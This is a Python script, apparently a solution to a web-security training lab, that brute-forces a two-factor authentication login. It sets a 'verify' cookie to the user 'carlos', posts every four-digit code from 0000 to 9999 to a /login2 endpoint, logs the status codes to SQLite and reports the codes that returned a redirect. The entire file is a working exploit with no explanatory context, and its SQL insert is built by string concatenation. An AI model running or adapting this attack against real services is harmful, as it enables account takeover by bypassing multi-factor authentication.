from dotenv import load_dotenv
import os
import requests
import sqlite3

load_dotenv()
url = os.getenv('URL')

# Relational database needed for intruder results
sqldb = sqlite3.connect("web_data.db")
cur = sqldb.cursor()

# Create table if it doesn't exist
tables = cur.execute(
  """SELECT name FROM sqlite_master WHERE type='table' 
    AND name='results';""").fetchall()

if tables != []:
    # must be empty
    cur.execute("DROP TABLE results;")

cur.execute("CREATE TABLE results(mfa,status_code)")

def load_result():
    cur.execute("""
        SELECT mfa,status_code FROM results WHERE status_code='302'
    """)
    rows = cur.fetchall()
    for row in rows:
        print(f"MFA: {row[0]}, Status Code: {row[1]}")

    sqldb.close()

def mfa_format(mfa):
    # from 0000 to 9999
    if mfa < 10:
        positions = '000'
    elif mfa < 100:
        positions = '00'
    elif mfa < 1000:
        positions = '0'
    else:
        positions = ''
    return positions + str(mfa)

def mfa_broken_logic():
    session = os.getenv('SESSION')
    user = "carlos"
    cookies = {
                'session': session,
                'verify': user
            }

    for mfa in range(0,10000):
        mfa_payload = mfa_format(mfa)
        with requests.Session() as request:
            brute_force = request.post(url + '/login2',
                                        cookies = cookies,
                                        data = {'mfa-code': mfa_payload})
            cur.execute("INSERT INTO results VALUES (" + mfa_payload + "," + str(brute_force.status_code) +")")
            sqldb.commit()

    print("RESULT:\n")
    load_result()

mfa_broken_logic()